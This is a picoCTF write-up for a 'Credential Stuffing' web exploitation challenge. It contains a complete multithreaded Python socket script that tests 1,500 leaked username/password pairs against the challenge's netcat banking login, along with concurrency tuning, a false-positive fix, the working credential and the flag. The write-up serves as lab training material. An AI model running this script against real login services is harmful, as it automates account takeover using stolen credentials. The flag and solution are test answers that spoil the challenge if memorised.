# Credential Stuffing

## Challenge Information

- **Platform:** picoCTF
- **Category:** Web Exploitation
- **Difficulty:** Medium
- **Challenge:** Credential Stuffing
- **Technique:** Credential Stuffing
- **Target:** `crystal-peak.picoctf.net`
- **Service:** TCP / Netcat

---

## Objective

The challenge provides a leaked credential database containing username/password pairs.

The goal is to test these credentials against an online banking service and identify a reused credential that provides access to the account and reveals the flag.

---

## Initial Enumeration

The challenge provides the credential dump:

```text
creds-dump.txt
````

The credentials were stored in the following format:

```text
username;password
```

Example:

```text
norberto;christ
delilah;roadking
jarvis;stolen
hada;memphis
hanni;licking
```

The challenge service can be accessed using:

```bash
nc crystal-peak.picoctf.net <PORT>
```

For example:

```bash
nc crystal-peak.picoctf.net 59930
```

The service displayed:

```text
=========================================
Welcome to the Online Banking Service!
=========================================

Please enter your username & password to login.
Username:
Password:
```

A manual login attempt with an arbitrary credential resulted in:

```text
Invalid username or password
```

Testing 1,500 credentials manually would be inefficient, so I decided to automate the process using Python sockets.

---

## Approach

The basic workflow was:

```text
Credential Dump
      |
      v
Read username/password pairs
      |
      v
Connect to TCP service
      |
      v
Send username
      |
      v
Send password
      |
      v
Analyze server response
      |
      v
Identify successful authentication
```

Since the service communicates over TCP, Python's `socket` module was used instead of HTTP libraries.

---

## Initial Script

The first version expected credentials in this format:

```text
username:password
```

However, the actual file used:

```text
username;password
```

The parser was therefore changed from:

```python
username, password = line.split(":", 1)
```

to:

```python
username, password = line.split(";", 1)
```

---

## Adding Multithreading

There were 1,500 credentials to test.

To speed up the process, I used Python's `ThreadPoolExecutor`.

The initial configuration used:

```python
WORKERS = 30
```

However, the server began resetting connections:

```text
ERROR: [Errno 104] Connection reset by peer
```

This indicated that too many simultaneous connections were being rejected by the challenge service.

The number of workers was reduced to:

```python
WORKERS = 5
```

This made the connection handling much more reliable.

---

## False Positive Problem

The first success condition was:

```python
if "Invalid username or password" not in response:
    return username, password, response
```

This turned out to be incorrect.

For example, the script reported:

```text
Username: guía
Password: ursitesux
Response:
```

The response was empty.

Because the string `"Invalid username or password"` was not present, the script incorrectly classified the attempt as successful.

Another false positive occurred with:

```text
Username: randa
Password: stacey1
Response:
```

Again, the response was empty.

This demonstrated an important scripting mistake:

> An empty response must not be treated as a successful authentication.

---

## Improved Response Validation

The script was modified to explicitly reject empty responses:

```python
if not response:
    return None

if "Invalid username or password" in response:
    return None

return username, password, response
```

The logic became:

```text
Empty response
     |
     └──> Ignore

"Invalid username or password"
     |
     └──> Ignore

Any actual authentication response
     |
     └──> Investigate
```

---

## Final Script

```python
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

HOST = "crystal-peak.picoctf.net"
PORT = 63181
WORKERS = 5


def try_login(username, password):
    try:
        s = socket.create_connection((HOST, PORT), timeout=5)

        # Wait for username prompt
        data = b""
        while b"Username:" not in data:
            chunk = s.recv(1024)

            if not chunk:
                s.close()
                return None

            data += chunk

        s.sendall((username + "\n").encode())

        # Wait for password prompt
        data = b""
        while b"Password:" not in data:
            chunk = s.recv(1024)

            if not chunk:
                s.close()
                return None

            data += chunk

        s.sendall((password + "\n").encode())

        # Receive final response
        s.settimeout(3)
        response = b""

        while True:
            try:
                chunk = s.recv(4096)

                if not chunk:
                    break

                response += chunk

            except socket.timeout:
                break

        s.close()

        response = response.decode(errors="replace").strip()

        # Ignore normal failures
        if not response:
            return None

        if "Invalid username or password" in response:
            return None

        return username, password, response

    except Exception:
        return None


# Load credential dump
credentials = []

with open("creds-dump.txt", encoding="utf-8") as f:
    for line in f:
        line = line.strip()

        if not line or ";" not in line:
            continue

        username, password = line.split(";", 1)
        credentials.append((username, password))


print(f"[*] Loaded {len(credentials)} credentials")
print(f"[*] Target: {HOST}:{PORT}")
print(f"[*] Threads: {WORKERS}")
print("[*] Starting credential stuffing...")


found = False

with ThreadPoolExecutor(max_workers=WORKERS) as executor:

    futures = [
        executor.submit(try_login, username, password)
        for username, password in credentials
    ]

    for future in as_completed(futures):

        result = future.result()

        if result:
            username, password, response = result

            print("\n" + "=" * 55)
            print("[+] VALID CREDENTIALS FOUND")
            print("=" * 55)
            print(f"[+] Username: {username}")
            print(f"[+] Password: {password}")
            print("\n[+] Server response:")
            print(response)
            print("=" * 55)

            found = True

            for f in futures:
                f.cancel()

            break


if not found:
    print("\n[-] No valid credentials found.")
```

---

## Execution

The final instance was running on port `63181`.

The script was executed with:

```bash
python3 solve.py
```

Output:

```text
[*] Loaded 1500 credentials
[*] Target: crystal-peak.picoctf.net:63181
[*] Threads: 5
[*] Starting credential stuffing...

=======================================================
[+] VALID CREDENTIALS FOUND
=======================================================
[+] Username: fu-shin
[+] Password: bigpoppa

[+] Server response:
bigpoppa

Authenticating...
Welcome fu-shin!
picoCTF{d0nt_r3u5e_cr3d3nt1als_8da03d15}
=======================================================
```

---

## Valid Credentials

The reused credentials were:

```text
Username: fu-shin
Password: bigpoppa
```

The credentials successfully authenticated to the banking service.

---

## Flag

```text
picoCTF{d0nt_r3u5e_cr3d3nt1als_8da03d15}
```

---

## What I Learned

### 1. Credential Stuffing

Credential stuffing involves taking previously leaked username/password pairs and testing the same combinations against another service.

The attack relies on users reusing passwords across different websites.

### 2. Python Socket Programming

The challenge was a raw TCP service rather than an HTTP application.

I used:

```python
socket.create_connection()
```

to establish TCP connections and:

```python
sendall()
recv()
```

to communicate with the service.

### 3. Threading

Testing 1,500 credentials sequentially would take longer.

Using:

```python
ThreadPoolExecutor
```

allowed multiple login attempts to run concurrently.

However, more threads are not always better. Using 30 workers caused:

```text
Connection reset by peer
```

Reducing the concurrency to 5 produced more reliable results.

### 4. Response Validation

The biggest debugging lesson was avoiding assumptions about success.

This check was unreliable:

```python
if "Invalid username or password" not in response:
```

because an empty response also satisfies that condition.

The improved logic explicitly checks for:

```python
if not response:
    return None
```

before analyzing the response.

---

## Key Takeaway

This challenge demonstrated how a relatively small Python script can automate a repetitive CTF task.

The main concepts practiced were:

* TCP socket programming
* Credential parsing
* Concurrent connections
* Thread pools
* Server interaction
* Error handling
* Response validation
* Debugging false positives
* Credential stuffing
